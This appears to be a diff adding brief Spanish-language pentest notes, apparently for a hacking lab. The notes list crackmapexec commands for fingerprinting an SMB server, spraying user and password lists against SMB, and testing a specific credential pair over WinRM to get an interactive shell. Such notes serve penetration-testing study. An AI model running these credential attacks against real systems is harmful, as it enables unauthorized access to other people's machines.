@@ -1,0 +1,9 @@
+[Obtener la version del servidor]
+crackmapexec smb 10.10.10.82
+
+[Intentar obtener credenciales de usuarios]
+crackmapexec smb 10.10.10.193 -u users.txt -p pass.txt --continue-on-success | grep -v -i "failure"
+
+[Usamos winrm para saber si tenemos privilegios con las credenciales que tenemos para tener una shell interactiva]
+
+crackmapexec winrm 10.10.10.193 -u jorge -p jorge2003
